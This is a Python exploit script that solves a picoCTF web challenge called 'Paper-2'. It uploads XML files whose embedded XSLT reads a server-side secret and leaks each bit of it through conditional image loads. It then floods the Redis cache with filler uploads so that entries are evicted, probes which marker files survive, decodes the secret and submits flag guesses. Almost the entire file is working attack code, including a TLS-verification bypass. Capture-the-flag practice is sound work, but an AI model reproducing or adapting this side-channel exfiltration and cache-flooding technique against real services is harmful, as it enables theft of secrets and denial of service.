import asyncio
import random
import ssl
import sys
import time
from typing import Optional

import aiohttp

# ── Fixed constants ──────────────────────────────────────────────────
REDIS_MAX_MB  = 512
TOUCH         = 1
CONC          = 128
RETRIES       = 5
DEADLINE      = 58.0
MARKER_SIZE   = 20000
FILLER_SIZE   = 60000

ZERO_CHARS = {
    0: "01234567",
    1: "012389ab",
    2: "014589cd",
    3: "02468ace",
}

DIM    = "\033[2m"
BOLD   = "\033[1m"
GREEN  = "\033[32m"
CYAN   = "\033[36m"
YELLOW = "\033[33m"
RED    = "\033[31m"
RESET  = "\033[0m"


def _redis_bytes(raw_size: int) -> int:
    return int(raw_size * 4 / 3) + 100


def plan_parameters(upload_rate: float, probe_rate: float):
    marker_redis = _redis_bytes(MARKER_SIZE)
    filler_redis = _redis_bytes(FILLER_SIZE)
    replicas = 10
    n_markers = replicas * 256
    prefill = 1500
    pre_visit_mem = n_markers * marker_redis + prefill * filler_redis
    untouched_mem = (n_markers // 2) * marker_redis
    target_excess = untouched_mem + prefill * filler_redis * 0.05
    postfill = max(1000, int((REDIS_MAX_MB * 1024 * 1024 + target_excess - pre_visit_mem) / filler_redis))
    postfill_eta = postfill / upload_rate if upload_rate > 0 else 10
    probe_eta = (n_markers * 2) / probe_rate if probe_rate > 0 else 5
    max_wait = DEADLINE - postfill_eta - probe_eta - 3.0
    wait = max(5.0, min(replicas * 2.0 + 5.0, max_wait))
    return replicas, prefill, postfill, wait


# ── Helpers ──────────────────────────────────────────────────────────

def make_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def _exc_brief(e: BaseException) -> str:
    msg = str(e).strip()
    return f"{type(e).__name__}: {msg}" if msg else type(e).__name__

def _rate(count: int, seconds: float) -> float:
    return count / seconds if seconds > 0 else float("inf")


# ── Async Upload / Probe ────────────────────────────────────────────

async def async_upload(session, base, data, name, mime, retries=RETRIES):
    last_exc: Optional[BaseException] = None
    for a in range(retries):
        try:
            form = aiohttp.FormData()
            form.add_field("file", data, filename=name, content_type=mime)
            async with session.post(
                f"{base}/upload", data=form, allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=120),
            ) as r:
                loc = r.headers.get("Location", "")
                pid = loc.split("/paper/")[-1]
                if r.status == 302 and pid and pid != loc:
                    return pid
        except Exception as e:
            last_exc = e
        await asyncio.sleep(0.3 * (a + 1))
    detail = f" ({_exc_brief(last_exc)})" if last_exc else ""
    raise RuntimeError(f"upload failed: {name}{detail}") from last_exc


async def async_head(session, base, pid, retries=2):
    last_exc: Optional[BaseException] = None
    for a in range(retries):
        try:
            async with session.head(
                f"{base}/paper/{pid}",
                timeout=aiohttp.ClientTimeout(total=15),
            ) as r:
                return int(r.headers.get("Content-Length", "0")) > 100
        except Exception as e:
            last_exc = e
            await asyncio.sleep(0.1 * (a + 1))
    return False


async def batch_upload(session, base, items, conc=CONC, retries=RETRIES, quiet=False):
    sem = asyncio.Semaphore(conc)
    out = {}
    done = [0]
    total = len(items)
    t0 = time.time()
    last_print = [0.0]

    async def _one(lbl, data, name, mime):
        async with sem:
            out[lbl] = await async_upload(session, base, data, name, mime, retries)
            done[0] += 1
            now = time.time()
            if not quiet and (now - last_print[0] >= 0.5 or done[0] == total):
                last_print[0] = now
                pct = int(done[0] / total * 100)
                print(f"\r  {DIM}{done[0]}/{total} ({pct}%){RESET}   ", end="", flush=True)

    await asyncio.gather(*[_one(*it) for it in items])
    if not quiet:
        elapsed = time.time() - t0
        print(f"\r  {DIM}{total}/{total} done in {elapsed:.1f}s{RESET}   ", flush=True)
    return out


async def batch_head(session, base, items, conc=CONC, retries=2):
    sem = asyncio.Semaphore(conc)
    out = {}
    async def _one(label, pid):
        async with sem:
            out[label] = await async_head(session, base, pid, retries)
    await asyncio.gather(*[_one(*it) for it in items])
    return out


async def estimate_probe_rate(session, base, pid, conc=CONC, samples=64):
    items = [(f"cal_{i}", pid) for i in range(samples)]
    t0 = time.time()
    res = await batch_head(session, base, items, conc=min(conc, samples), retries=1)
    dt = time.time() - t0
    ok = sum(1 for v in res.values() if v)
    if ok != samples:
        raise RuntimeError(f"probe calibration failed ({ok}/{samples} succeeded)")
    return _rate(samples, dt)


# ── XSLT / Launcher ─────────────────────────────────────────────────

def make_xslt(rep, markers, touch):
    lines = [
        '<?xml version="1.0"?>',
        '<?xml-stylesheet type="text/xsl" href="#e"?>',
        "<d>",
        '<xsl:stylesheet xml:id="e" version="1.0"'
        ' xmlns:xsl="http://www.w3.org/1999/XSL/Transform">',
        '<xsl:template match="/">',
        '<xsl:variable name="s" select="document(\'/secret\')/body/@secret"/>',
        "<html><body>",
    ]
    for pos in range(32):
        for bit in range(4):
            z_pid, o_pid = markers[pos][bit]
            test = f"contains('{ZERO_CHARS[bit]}',substring($s,{pos+1},1))"
            z_imgs = "".join(
                f'<img src="/paper/{z_pid}?r={rep}&amp;t={k}"/>' for k in range(touch)
            )
            o_imgs = "".join(
                f'<img src="/paper/{o_pid}?r={rep}&amp;t={k}"/>' for k in range(touch)
            )
            lines.append(f'<xsl:if test="{test}">{z_imgs}</xsl:if>')
            lines.append(f'<xsl:if test="not({test})">{o_imgs}</xsl:if>')
    lines.append("</body></html></xsl:template></xsl:stylesheet></d>")
    return "".join(lines).encode()

def make_launcher(xslt_ids):
    body = "".join(
        f'<iframe src="/paper/{pid}" width="1" height="1" loading="eager"></iframe>'
        for pid in xslt_ids
    )
    return f"<!doctype html><html><body>{body}</body></html>".encode()


# ── Decoding ─────────────────────────────────────────────────────────

def decode(probe_res, n_replicas):
    bits, confidence, n_strict = [], [], 0
    for pos in range(32):
        nib, nib_conf = [], []
        for bit in range(4):
            sz = so = az = ao = 0
            for rep in range(n_replicas):
                z = probe_res.get((rep, pos, bit, 0))
                o = probe_res.get((rep, pos, bit, 1))
                if z is None or o is None: continue
                if z: az += 1
                if o: ao += 1
                if z and not o: sz += 1
                elif o and not z: so += 1
            if sz > so:     nib.append("0"); nib_conf.append(sz - so); n_strict += 1
            elif so > sz:   nib.append("1"); nib_conf.append(so - sz); n_strict += 1
            elif az > ao:   nib.append("0"); nib_conf.append(0)
            elif ao > az:   nib.append("1"); nib_conf.append(0)
            else:           nib.append("?"); nib_conf.append(-1)
        bits.append("".join(nib))
        confidence.append(nib_conf)
    return bits, confidence, n_strict

def ranked_candidates(chunks, conf, max_cands=64):
    resolved = [c.replace("?", "0") for c in chunks]
    base = "".join(f"{int(r, 2):x}" for r in resolved)
    weak = sorted([(conf[p][b], p, b) for p in range(32) for b in range(4) if 0 <= conf[p][b] <= 3])
    cands = [base]; seen = {base}
    for _c, p, b in weak:
        nib = list(resolved[p]); nib[b] = "1" if nib[b] == "0" else "0"
        rc = list(resolved); rc[p] = "".join(nib)
        c = "".join(f"{int(r, 2):x}" for r in rc)
        if c not in seen: cands.append(c); seen.add(c)
        if len(cands) >= max_cands: break
    if len(cands) < max_cands:
        for i in range(min(len(weak), 20)):
            for j in range(i + 1, min(len(weak), 20)):
                _, p1, b1 = weak[i]; _, p2, b2 = weak[j]
                rc = list(resolved)
                n1 = list(rc[p1]); n1[b1] = "1" if n1[b1] == "0" else "0"; rc[p1] = "".join(n1)
                n2 = list(rc[p2]); n2[b2] = "1" if n2[b2] == "0" else "0"; rc[p2] = "".join(n2)
                c = "".join(f"{int(r, 2):x}" for r in rc)
                if c not in seen: cands.append(c); seen.add(c)
                if len(cands) >= max_cands: break
            if len(cands) >= max_cands: break
    return cands


# ── Bot interaction ──────────────────────────────────────────────────

async def wait_browser(session, base, timeout=300):
    last_exc: Optional[BaseException] = None
    errs = 0
    for _ in range(timeout):
        try:
            async with session.get(f"{base}/visit/99999999", timeout=aiohttp.ClientTimeout(total=30)) as r:
                if (await r.text()).strip() != "browser still open!": return True
            errs = 0
        except Exception as e:
            last_exc = e; errs += 1
            if errs >= 5: raise RuntimeError(f"cannot reach {base!r}: {_exc_brief(e)}") from e
        await asyncio.sleep(1)
    return False

async def start_visit(session, base, lid):
    last_exc: Optional[BaseException] = None
    errs = 0
    for _ in range(60):
        try:
            async with session.get(f"{base}/visit/{lid}", timeout=aiohttp.ClientTimeout(total=30)) as r:
                t = (await r.text()).strip()
                if t == "visiting!": return True
                if t == "not found!": return False
            errs = 0
        except Exception as e:
            last_exc = e; errs += 1
            if errs >= 5: raise RuntimeError(f"cannot reach {base!r}: {_exc_brief(e)}") from e
        await asyncio.sleep(1)
    return False

async def submit_flag(session, base, secret):
    async with session.get(f"{base}/flag", params={"secret": secret}, timeout=aiohttp.ClientTimeout(total=30)) as r:
        return (await r.text()).strip()


# ── Main ─────────────────────────────────────────────────────────────

async def main():
    print(f"\n{CYAN}  Paper-2 solver{RESET}")
    print(f"  Start a fresh instance on picoCTF, then paste the URL.\n")
    base = input(f"  {CYAN}Instance URL:{RESET} ").strip().rstrip("/")
    if not base:
        sys.exit(f"  {RED}No URL.{RESET}")

    rng = random.Random(int(time.time() * 1000) & 0x7FFFFFFF)
    ssl_ctx = make_ssl_ctx()
    conn = aiohttp.TCPConnector(limit=CONC, ssl=ssl_ctx)

    async with aiohttp.ClientSession(connector=conn) as session:

        # 1 - browser
        print(f"\n  {DIM}Waiting for browser ...{RESET}", end="", flush=True)
        try:
            if not await wait_browser(session, base):
                sys.exit(f"\n  {RED}Browser never free.{RESET}")
        except RuntimeError as e:
            sys.exit(f"\n  {RED}{e}{RESET}")
        print(f"\r  Browser ready.              ", flush=True)

        # 2 - calibrate
        print(f"  {DIM}Calibrating ...{RESET}", end="", flush=True)
        cal_blob = bytes(rng.getrandbits(8) for _ in range(MARKER_SIZE))
        cal_tasks = [(f"c_{i}", cal_blob, f"c_{i}.bin", "application/octet-stream") for i in range(64)]
        t0 = time.time()
        cal_res = await batch_upload(session, base, cal_tasks, CONC, RETRIES, quiet=True)
        upload_rate = _rate(64, time.time() - t0)
        cal_pid = list(cal_res.values())[0]
        try: probe_rate = await estimate_probe_rate(session, base, cal_pid, CONC)
        except RuntimeError: probe_rate = max(upload_rate * 3.0, 64.0)
        R, prefill, postfill, wait = plan_parameters(upload_rate, probe_rate)
        n_markers = R * 256
        print(f"\r  Speed: upload {upload_rate:.0f}/s, probe {probe_rate:.0f}/s  "
              f"| {R} replicas, wait {wait:.0f}s      ", flush=True)

        # 3 - markers
        print(f"  Uploading {n_markers} markers ...", flush=True)
        blob = bytes(rng.getrandbits(8) for _ in range(MARKER_SIZE))
        swap = {}; tasks = []
        for rep in range(R):
            for pos in range(32):
                for bit in range(4):
                    s = rng.random() < 0.5; swap[(rep, pos, bit)] = s
                    tasks.append(((rep, pos, bit, "a"), blob, f"m{rep}_{pos}_{bit}_a.bin", "application/octet-stream"))
                    tasks.append(((rep, pos, bit, "b"), blob, f"m{rep}_{pos}_{bit}_b.bin", "application/octet-stream"))
        rng.shuffle(tasks)
        mres = await batch_upload(session, base, tasks, CONC, RETRIES)
        mpids = []
        for rep in range(R):
            rm = []
            for pos in range(32):
                pm = []
                for bit in range(4):
                    a, b = mres[(rep, pos, bit, "a")], mres[(rep, pos, bit, "b")]
                    pm.append((b, a) if swap[(rep, pos, bit)] else (a, b))
                rm.append(pm)
            mpids.append(rm)
        all_probes = []
        for rep in range(R):
            for pos in range(32):
                for bit in range(4):
                    z, o = mpids[rep][pos][bit]
                    all_probes.append(((rep, pos, bit, 0), z))
                    all_probes.append(((rep, pos, bit, 1), o))

        # 4 - prefill
        print(f"  Uploading {prefill} prefill ...", flush=True)
        pf_tasks = [(f"pre_{i}", b"P" * FILLER_SIZE, f"pre_{i}.bin", "application/octet-stream") for i in range(prefill)]
        t0 = time.time()
        await batch_upload(session, base, pf_tasks, CONC, RETRIES, quiet=True)
        upload_rate = min(upload_rate, _rate(prefill, time.time() - t0))

        # 5 - XSLTs
        print(f"  Uploading {R} XSLT payloads ...", flush=True)
        xt = []
        for rep in range(R):
            data = make_xslt(rep, mpids[rep], TOUCH)
            xt.append((("x", rep), data, f"x{rep}.xml", "application/xml"))
        rng.shuffle(xt)
        xres = await batch_upload(session, base, xt, min(R, 16), RETRIES, quiet=True)
        xslt_ids = [xres[("x", r)] for r in range(R)]
        lid = await async_upload(session, base, make_launcher(xslt_ids), "l.html", "text/html", RETRIES)

        _, _, postfill, wait = plan_parameters(upload_rate, probe_rate)

        # 6 - attack
        print(f"\n  {BOLD}Attacking ...{RESET}", flush=True)
        tv = time.time()
        try: started = await start_visit(session, base, lid)
        except RuntimeError as e: sys.exit(f"  {RED}{e}{RESET}")
        if not started: sys.exit(f"  {RED}Visit failed.{RESET}")

        # countdown
        wait_end = time.time() + wait
        while True:
            left = wait_end - time.time()
            if left <= 0: break
            print(f"\r  {DIM}Browser rendering ... {int(left)+1}s{RESET}   ", end="", flush=True)
            await asyncio.sleep(min(1.0, left))
        print(f"\r  {DIM}Browser rendering ... done.{RESET}   ", flush=True)

        # postfill
        elapsed = time.time() - tv
        probe_eta = len(all_probes) / probe_rate if probe_rate > 0 else 5
        cap = min(postfill, max(0, int((DEADLINE - elapsed - probe_eta - 3.0) * upload_rate)))
        print(f"  Postfill {cap} entries ...", flush=True)
        pf_tasks = [(f"pf_{i}", b"F" * FILLER_SIZE, f"pf_{i}.bin", "application/octet-stream") for i in range(cap)]
        if cap > 0:
            await batch_upload(session, base, pf_tasks, CONC, RETRIES)

        # probe
        elapsed = time.time() - tv
        print(f"  {DIM}Probing ...{RESET}", end="", flush=True)
        probe_res = await batch_head(session, base, all_probes, CONC, 2)
        alive = sum(1 for v in probe_res.values() if v)
        dead  = sum(1 for v in probe_res.values() if not v)
        evict = dead / (alive + dead) * 100
        print(f"\r  Probed: alive={alive} dead={dead} evict={evict:.0f}%      ", flush=True)

        # decode
        bits, conf, n_strict = decode(probe_res, R)
        unk = sum(c.count("?") for c in bits)
        all_c = [c for row in conf for c in row if c >= 0]
        n_strong = sum(1 for c in all_c if c >= 4)
        secret_hex = "".join(f"{int(c.replace('?', '0'), 2):x}" for c in bits)
        sc = GREEN if n_strict == 128 else (YELLOW if n_strict >= 110 else RED)
        print(f"  Decode: {sc}{n_strict}/128 bits{RESET}, {n_strong} strong", flush=True)

        # submit
        elapsed = time.time() - tv
        cands = ranked_candidates(bits, conf, 64)
        print(f"  Submitting {len(cands)} candidate(s) (t+{elapsed:.0f}s) ...", flush=True)

        for ci, cand in enumerate(cands):
            text = await submit_flag(session, base, cand)
            if "picoCTF{" in text or "CTF{" in text:
                print(f"\n  {GREEN}{BOLD}{text}{RESET}\n")
                return
            elif "nice try" in text:
                print(f"  {RED}Secret expired after {ci} attempts.{RESET}")
                break
            elif ci == 0:
                print(f"  {DIM}#{ci} wrong, trying more ...{RESET}", flush=True)

        print(f"\n  {RED}Failed. Try a fresh instance.{RESET}\n")


if __name__ == "__main__":
    asyncio.run(main())
